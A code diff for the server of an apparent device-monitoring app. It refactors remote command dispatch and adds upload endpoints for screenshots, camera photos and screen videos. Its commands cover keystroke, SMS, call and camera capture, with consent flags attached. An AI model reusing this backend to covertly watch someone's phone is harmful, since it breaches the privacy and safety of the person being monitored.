@@ -14,6 +14,18 @@ import {
   hashPassword, comparePassword, comparePasswordDummy
 } from './auth.js';
 import { createRateLimiter, allowAttempt } from './rate-limit.js';
+import {
+  STATUS as CMD_STATUS,
+  TERMINAL_STATUSES,
+  DEVICE_REPORTABLE_STATUSES,
+  ALLOWED_COMMAND_TYPES,
+  normalizeStatus,
+  canTransition,
+  validateAndNormalizeParams,
+  coerceParamsToStrings,
+  ttlMsFor,
+  getCommandSpec
+} from './commands.js';
 import QRCode from 'qrcode';
 
 const __filename = fileURLToPath(import.meta.url);
@@ -1591,164 +1603,178 @@ app.put('/api/devices/:id/permissions', ingestLimiter, deviceDataAuth, ah(async 
 
 // ==========================================
 // COMMAND DISPATCH SYSTEM
+// Contract: server/src/commands.js + docs/COMMAND_CONTRACT.md
+// Lifecycle: QUEUED -> DELIVERED -> RECEIVED -> EXECUTING -> COMPLETED
+//            (+ FAILED, REJECTED, EXPIRED, CANCELLED). A WebSocket send only
+//            marks DELIVERED — completion requires a validated device result.
 // ==========================================
-const ALLOWED_COMMAND_TYPES = new Set([
-  'REFRESH_TELEMETRY', 'REQUEST_LOCATION', 'REQUEST_APPS', 'REQUEST_USAGE',
-  'SYNC_DEVICE', 'SYNC_FILES', 'SYNC_NOTIFICATIONS', 'SYNC_CONTACTS',
-  'SYNC_APPLICATIONS', 'SYNC_USAGE', 'SYNC_SMS', 'SYNC_CALLS', 'SYNC_KEYSTROKES',
-  'REFRESH_PERMISSIONS', 'SEND_NOTIFICATION', 'UPLOAD_FILE',
-  'TAKE_SCREENSHOT', 'TAKE_PHOTO', 'RECORD_SCREEN',
-  'START_RECORDING', 'STOP_RECORDING', 'LAUNCH_APP', 'UNINSTALL_APP'
-]);
+import {
+  insertCommand, getCommand, findCommandByIdempotencyKey,
+  listCommandsForDevice, expireOverdueCommands, updateCommandStatus,
+  toWireCommand
+} from './command-store.js';
 
-const COMMAND_STATUSES = new Set(['PENDING', 'QUEUED', 'SENT', 'RECEIVED', 'EXECUTING', 'COMPLETED', 'FAILED', 'CANCELLED', 'EXPIRED']);
-
-const ALLOWED_UPLOAD_ROOTS = ['/storage/emulated/0/', '/sdcard/', '/mnt/sdcard/'];
-
-function validateCommandParameters(commandType, parameters) {
-  if (parameters && typeof parameters !== 'object') {
-    return 'parameters must be an object';
-  }
-  if (commandType === 'UPLOAD_FILE') {
-    const p = parameters?.path;
-    if (typeof p !== 'string' || p.length === 0 || p.length > 1024) {
-      return 'UPLOAD_FILE requires a valid parameters.path';
-    }
-    if (p.includes('..') || p.includes('\u0000')) {
-      return 'UPLOAD_FILE path contains illegal sequences';
-    }
-    if (!ALLOWED_UPLOAD_ROOTS.some(root => p.startsWith(root))) {
-      return `UPLOAD_FILE path must be under ${ALLOWED_UPLOAD_ROOTS[0]}`;
-    }
-  }
-  return null;
+function httpStatusFromUpdate(update) {
+  if (update.ok) return null;
+  if (update.reason === 'not-found') return 404;
+  if (update.reason === 'invalid-status') return 400;
+  if (update.reason === 'invalid-transition') return 409;
+  return 400;
 }
 
 app.post('/api/devices/:id/commands', requireUser, requireDeviceOwner, ah(async (req, res) => {
   const { id } = req.params;
-  const { commandType, parameters } = req.body;
+  const { commandType, parameters, idempotencyKey, ttlSeconds } = req.body;
 
   if (!commandType || typeof commandType !== 'string') {
     return res.status(400).json({ error: 'commandType required' });
   }
-  if (!ALLOWED_COMMAND_TYPES.has(commandType)) {
+  const spec = getCommandSpec(commandType);
+  if (!spec) {
     return res.status(400).json({ error: `Unknown commandType. Allowed: ${[...ALLOWED_COMMAND_TYPES].join(', ')}` });
   }
-  const paramError = validateCommandParameters(commandType, parameters);
-  if (paramError) {
-    return res.status(400).json({ error: paramError });
+  const validated = validateAndNormalizeParams(commandType, parameters);
+  if (validated.error) {
+    return res.status(400).json({ error: validated.error });
+  }
+
+  // Idempotent re-submission: same device + key returns the original command
+  // instead of creating a duplicate (protects retries and reconnect storms).
+  const idem = typeof idempotencyKey === 'string' && idempotencyKey.length > 0 && idempotencyKey.length <= 128
+    ? idempotencyKey : null;
+  if (idem) {
+    const existing = await findCommandByIdempotencyKey(id, idem);
+    if (existing) {
+      return res.json({
+        commandId: existing.id || existing.commandId,
+        status: existing.status,
+        dispatchedToOnlineDevice: false,
+        queued: !TERMINAL_STATUSES.has(existing.status),
+        idempotentReplay: true,
+        expiresAt: existing.expires_at ? Number(existing.expires_at) : null,
+        command: toWireCommand(existing)
+      });
+    }
   }
 
   const commandId = 'cmd_' + Date.now() + '_' + crypto.randomBytes(3).toString('hex');
   const now = Date.now();
+  const expiresAt = now + ttlMsFor(commandType, ttlSeconds);
 
   const command = {
     commandId,
     deviceId: id,
     commandType,
-    parameters: parameters || {},
-    status: 'PENDING',
-    timestamp: now
+    parameters: validated.params,
+    status: CMD_STATUS.QUEUED,
+    timestamp: now,
+    expiresAt
   };
 
   // Persist BEFORE attempting delivery so offline devices can be replayed.
-  if (db.isPostgres()) {
-    await db.query(
-      `INSERT INTO commands (id, device_id, user_id, command_type, parameters, status, timestamp)
-       VALUES ($1, $2, $3, $4, $5, $6, $7)`,
-      [commandId, id, req.user.id, commandType, JSON.stringify(parameters || {}), 'PENDING', now]
-    );
-  } else {
-    db.getMemoryStore().commands.set(commandId, {
-      ...command,
-      id: commandId,
-      command_type: commandType,
-      user_id: req.user.id
-    });
-  }
+  await insertCommand({
+    ...command,
+    userId: req.user.id,
+    idempotencyKey: idem
+  });
 
   logAudit(req.user.id, id, 'DISPATCH_COMMAND', { commandType, commandId }, req.ip);
 
   // Attempt live delivery; the command stays queued if the device is offline.
   const dispatched = wsManager.sendCommandToDevice(id, command);
   if (dispatched) {
-    if (db.isPostgres()) {
-      await db.query(`UPDATE commands SET status = 'SENT' WHERE id = $1`, [commandId]);
-    } else {
-      const cmd = db.getMemoryStore().commands.get(commandId);
-      if (cmd) cmd.status = 'SENT';
-    }
+    await updateCommandStatus(commandId, id, CMD_STATUS.DELIVERED);
   }
 
+  const finalStatus = dispatched ? CMD_STATUS.DELIVERED : CMD_STATUS.QUEUED;
   res.json({
     commandId,
-    status: dispatched ? 'SENT' : 'PENDING',
+    status: finalStatus,
     dispatchedToOnlineDevice: dispatched,
-    queued: !dispatched
+    queued: !dispatched,
+    expiresAt,
+    requiresConsent: spec.requiresConsent,
+    command: { ...command, status: finalStatus }
   });
 }));
 
 app.get('/api/devices/:id/commands', requireUser, requireDeviceOwner, ah(async (req, res) => {
   const { id } = req.params;
-  if (db.isPostgres()) {
-    const result = await db.query(
-      'SELECT * FROM commands WHERE device_id = $1 ORDER BY timestamp DESC LIMIT 50',
-      [id]
-    );
-    res.json(result.rows);
-  } else {
-    const list = Array.from(db.getMemoryStore().commands.values())
-      .filter(c => c.deviceId === id || c.device_id === id)
-      .sort((a, b) => b.timestamp - a.timestamp);
-    res.json(list);
+  await expireOverdueCommands(id);
+  const rows = await listCommandsForDevice(id, 50);
+  res.json(rows);
+}));
+
+// Cancel a command that has not started executing on the device yet.
+app.post('/api/devices/:id/commands/:commandId/cancel', requireUser, requireDeviceOwner, ah(async (req, res) => {
+  const { id, commandId } = req.params;
+  const update = await updateCommandStatus(commandId, id, CMD_STATUS.CANCELLED);
+  if (!update.ok) {
+    const code = httpStatusFromUpdate(update);
+    const message = update.reason === 'invalid-transition'
+      ? `Command cannot be cancelled from status ${update.previous}`
+      : (update.reason === 'not-found' ? 'Command not found for this device' : 'Invalid request');
+    return res.status(code).json({ error: message, previousStatus: update.previous });
   }
+  if (!update.duplicate) {
+    wsManager.broadcastToDashboards({
+      type: 'COMMAND_STATUS_UPDATED',
+      deviceId: id,
+      commandId,
+      status: CMD_STATUS.CANCELLED,
+      timestamp: Date.now()
+    });
+  }
+  // Cancelling an already-cancelled command is an idempotent no-op.
+  res.json({ success: true, status: CMD_STATUS.CANCELLED, duplicate: Boolean(update.duplicate) });
 }));
 
 // Command status updates: authenticated device OR owning user; the command
-// must belong to the device in the URL and use a known status.
+// must belong to the device in the URL. Statuses are normalized (legacy
+// PENDING/SENT/RUNNING accepted) and lifecycle transitions are enforced — a
+// terminal command can never be re-written except by an idempotent duplicate
+// report of the same terminal status.
 app.post('/api/devices/:id/commands/:commandId/status', ingestLimiter, deviceDataAuth, ah(async (req, res) => {
   const { id, commandId } = req.params;
   const { status, result, errorMessage } = req.body;
 
-  if (!COMMAND_STATUSES.has(status)) {
+  const normalized = normalizeStatus(status);
+  if (!normalized || !DEVICE_REPORTABLE_STATUSES.has(normalized)) {
     return res.status(400).json({ error: 'Invalid command status' });
   }
 
-  const now = Date.now();
-  let updated = false;
-
-  if (db.isPostgres()) {
-    const upd = await db.query(
-      'UPDATE commands SET status = $1, result = $2, error_message = $3, completion_timestamp = $4 WHERE id = $5 AND device_id = $6',
-      [status, result || null, errorMessage || null, now, commandId, id]
-    );
-    updated = upd.rowCount > 0;
-  } else {
-    const cmd = db.getMemoryStore().commands.get(commandId);
-    if (cmd && (cmd.deviceId === id || cmd.device_id === id)) {
-      cmd.status = status;
-      cmd.result = result;
-      cmd.error_message = errorMessage;
-      cmd.completion_timestamp = now;
-      updated = true;
-    }
+  // Results are stored as text (a JSON string for structured media results).
+  let resultText = null;
+  if (result !== undefined && result !== null) {
+    resultText = typeof result === 'string' ? result.slice(0, 4000) : JSON.stringify(result).slice(0, 4000);
   }
+  const errorText = typeof errorMessage === 'string' ? errorMessage.slice(0, 1000) : null;
 
-  if (!updated) {
-    return res.status(404).json({ error: 'Command not found for this device' });
+  const update = await updateCommandStatus(commandId, id, normalized, {
+    result: resultText,
+    errorMessage: errorText
+  });
+  if (!update.ok) {
+    const code = httpStatusFromUpdate(update);
+    return res.status(code).json({
+      error: update.reason === 'not-found' ? 'Command not found for this device' :
+        (update.reason === 'invalid-transition'
+          ? `Invalid status transition ${update.previous} -> ${update.normalized}`
+          : 'Invalid command status')
+    });
   }
 
   wsManager.broadcastToDashboards({
     type: 'COMMAND_STATUS_UPDATED',
     deviceId: id,
     commandId,
-    status,
-    result,
-    errorMessage,
-    timestamp: now
+    status: update.normalized,
+    result: resultText,
+    errorMessage: errorText,
+    timestamp: Date.now()
   });
 
-  res.json({ success: true });
+  res.json({ success: true, status: update.normalized, applied: update.applied, duplicate: Boolean(update.duplicate) });
 }));
 
 // ==========================================
@@ -1776,13 +1802,15 @@ app.post('/api/devices/:id/recordings', ingestLimiter, deviceDataAuth, upload.si
     file_name: req.file.filename,
     file_path: `/uploads/${req.file.filename}`,
     duration_ms: durationMs,
+    media_kind: 'audio',
+    size_bytes: req.file.size,
     created_at: new Date()
   };
 
   if (db.isPostgres()) {
     await db.query(
-      'INSERT INTO recordings (device_id, file_name, file_path, duration_ms) VALUES ($1, $2, $3, $4)',
-      [id, recording.file_name, recording.file_path, durationMs]
+      'INSERT INTO recordings (device_id, file_name, file_path, duration_ms, media_kind, size_bytes) VALUES ($1, $2, $3, $4, $5, $6)',
+      [id, recording.file_name, recording.file_path, durationMs, 'audio', recording.size_bytes]
     );
   } else {
     db.getMemoryStore().recordings.unshift(recording);
@@ -1804,6 +1832,123 @@ app.get('/api/devices/:id/recordings', requireUser, requireDeviceOwner, ah(async
     res.json(result.rows);
   } else {
     res.json(db.getMemoryStore().recordings.filter(r => r.device_id === id));
+  }
+}));
+
+// ---- Screenshot & screen-recording media (device uploads, owner-only reads) --
+const screenshotUpload = multer({
+  storage,
+  limits: { fileSize: 12 * 1024 * 1024, files: 1, fields: 10 },
+  fileFilter: (req, file, cb) => {
+    if (/^image\/(jpeg|png|webp)$/i.test(file.mimetype || '')) return cb(null, true);
+    cb(new multer.MulterError('LIMIT_UNEXPECTED_FILE', 'Screenshots must be JPEG/PNG/WebP images'));
+  }
+});
+const videoUpload = multer({
+  storage,
+  limits: { fileSize: 50 * 1024 * 1024, files: 1, fields: 10 },
+  fileFilter: (req, file, cb) => {
+    if (/^video\/(mp4|webm|3gpp|quicktime|x-matroska)$/i.test(file.mimetype || '')) {
+      return cb(null, true);
+    }
+    cb(new multer.MulterError('LIMIT_UNEXPECTED_FILE', 'Screen recordings must be video files'));
+  }
+});
+
+// Device uploads a screenshot (MediaProjection frame) or camera photo.
+app.post('/api/devices/:id/screenshots', ingestLimiter, deviceDataAuth, screenshotUpload.single('file'), handleUploadError, ah(async (req, res) => {
+  const { id } = req.params;
+  if (!req.file) {
+    return res.status(400).json({ error: 'No file uploaded' });
+  }
+  const kind = req.body.kind === 'camera' ? 'camera' : 'screenshot';
+  const width = parseInt(req.body.width) || 0;
+  const height = parseInt(req.body.height) || 0;
+  const item = {
+    id: Date.now(),
+    device_id: id,
+    file_name: req.file.filename,
+    file_path: `/uploads/${req.file.filename}`,
+    kind,
+    width,
+    height,
+    size_bytes: req.file.size,
+    created_at: new Date()
+  };
+  if (db.isPostgres()) {
+    const r = await db.query(
+      'INSERT INTO screenshots (device_id, file_name, file_path, kind, width, height, size_bytes) VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING *',
+      [id, item.file_name, item.file_path, kind, width, height, item.size_bytes]
+    );
+    item.id = r.rows[0].id;
+    item.created_at = r.rows[0].created_at;
+  } else {
+    db.getMemoryStore().screenshots.unshift(item);
+  }
+  wsManager.broadcastToDashboards({
+    type: 'SCREENSHOT_UPLOADED',
+    deviceId: id,
+    screenshot: item
+  });
+  res.json({ success: true, screenshot: item });
+}));
+
+app.get('/api/devices/:id/screenshots', requireUser, requireDeviceOwner, ah(async (req, res) => {
+  const { id } = req.params;
+  if (db.isPostgres()) {
+    const r = await db.query(
+      'SELECT * FROM screenshots WHERE device_id = $1 ORDER BY created_at DESC LIMIT 50', [id]
+    );
+    res.json(r.rows);
+  } else {
+    res.json(db.getMemoryStore().screenshots.filter(s => s.device_id === id).slice(0, 50));
+  }
+}));
+
+// Device uploads a finalized screen recording (video).
+app.post('/api/devices/:id/videos', ingestLimiter, deviceDataAuth, videoUpload.single('file'), handleUploadError, ah(async (req, res) => {
+  const { id } = req.params;
+  if (!req.file) {
+    return res.status(400).json({ error: 'No file uploaded' });
+  }
+  const durationMs = parseInt(req.body.durationMs) || 0;
+  const recording = {
+    id: Date.now(),
+    device_id: id,
+    file_name: req.file.filename,
+    file_path: `/uploads/${req.file.filename}`,
+    duration_ms: durationMs,
+    media_kind: 'video',
+    size_bytes: req.file.size,
+    created_at: new Date()
+  };
+  if (db.isPostgres()) {
+    const r = await db.query(
+      'INSERT INTO recordings (device_id, file_name, file_path, duration_ms, media_kind, size_bytes) VALUES ($1, $2, $3, $4, $5, $6) RETURNING *',
+      [id, recording.file_name, recording.file_path, durationMs, 'video', recording.size_bytes]
+    );
+    recording.id = r.rows[0].id;
+    recording.created_at = r.rows[0].created_at;
+  } else {
+    db.getMemoryStore().recordings.unshift(recording);
+  }
+  wsManager.broadcastToDashboards({
+    type: 'DEVICE_RECORDING_UPLOADED',
+    deviceId: id,
+    recording
+  });
+  res.json({ success: true, recording });
+}));
+
+app.get('/api/devices/:id/videos', requireUser, requireDeviceOwner, ah(async (req, res) => {
+  const { id } = req.params;
+  if (db.isPostgres()) {
+    const r = await db.query(
+      "SELECT * FROM recordings WHERE device_id = $1 AND media_kind = 'video' ORDER BY created_at DESC LIMIT 50", [id]
+    );
+    res.json(r.rows);
+  } else {
+    res.json(db.getMemoryStore().recordings.filter(r => r.device_id === id && r.media_kind === 'video').slice(0, 50));
   }
 }));
 
@@ -1847,7 +1992,10 @@ app.get('/uploads/:filename', requireUser, ah(async (req, res) => {
   let deviceId = null;
   if (db.isPostgres()) {
     const r = await db.query(
-      'SELECT device_id FROM files WHERE web_path = $1 UNION SELECT device_id FROM recordings WHERE file_path = $1 LIMIT 1',
+      `SELECT device_id FROM files WHERE web_path = $1
+       UNION SELECT device_id FROM recordings WHERE file_path = $1
+       UNION SELECT device_id FROM screenshots WHERE file_path = $1
+       LIMIT 1`,
       [webPath]
     );
     deviceId = r.rows[0]?.device_id || null;
@@ -1855,7 +2003,8 @@ app.get('/uploads/:filename', requireUser, ah(async (req, res) => {
     const store = db.getMemoryStore();
     const fileEntry = store.files.find(f => f.web_path === webPath);
     const recEntry = store.recordings.find(r => r.file_path === webPath);
-    deviceId = fileEntry?.device_id || recEntry?.device_id || null;
+    const shotEntry = store.screenshots.find(s => s.file_path === webPath);
+    deviceId = fileEntry?.device_id || recEntry?.device_id || shotEntry?.device_id || null;
   }
 
   if (!deviceId) {
